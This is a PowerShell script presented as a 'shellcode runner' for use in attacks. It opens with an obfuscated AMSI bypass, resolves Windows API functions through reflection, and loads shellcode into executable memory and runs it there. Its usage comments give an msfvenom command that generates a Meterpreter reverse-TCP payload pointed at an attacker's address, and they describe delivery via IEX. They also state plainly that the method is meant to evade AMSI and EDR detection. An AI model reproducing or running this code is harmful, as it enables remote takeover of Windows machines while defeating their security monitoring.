# ps1-runner.ps1 — Pure PowerShell shellcode runner
# No C# compilation needed. Shellcode runs in the current powershell.exe process.
#
# USAGE:
#   1. Generate shellcode:
#      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f powershell
#   2. Replace $buf below with the output
#   3. Deliver: IEX or file
#
# WHY THIS APPROACH (LookupFunc vs Add-Type):
#   Add-Type compiles C# inline, which is noisy (writes temp files, spawns csc.exe).
#   LookupFunc resolves WinAPI function pointers through reflection — no compilation,
#   no temp files, harder for AMSI/EDR to hook.

# AMSI bypass (run this first or embed it here)
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)

function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# ── PASTE YOUR SHELLCODE HERE ──────────────────────────────────────────────────
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f powershell
# Output looks like: [Byte[]] $buf = 0xfc,0x48,...
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0  # <-- replace with full output
# ──────────────────────────────────────────────────────────────────────────────

# Allocate RWX memory
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualAlloc),
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Copy shellcode to allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# Execute and wait
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CreateThread),
    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll WaitForSingleObject),
    (getDelegateType @([IntPtr], [Int32]) ([Int32]))
).Invoke($hThread, 0xFFFFFFFF)
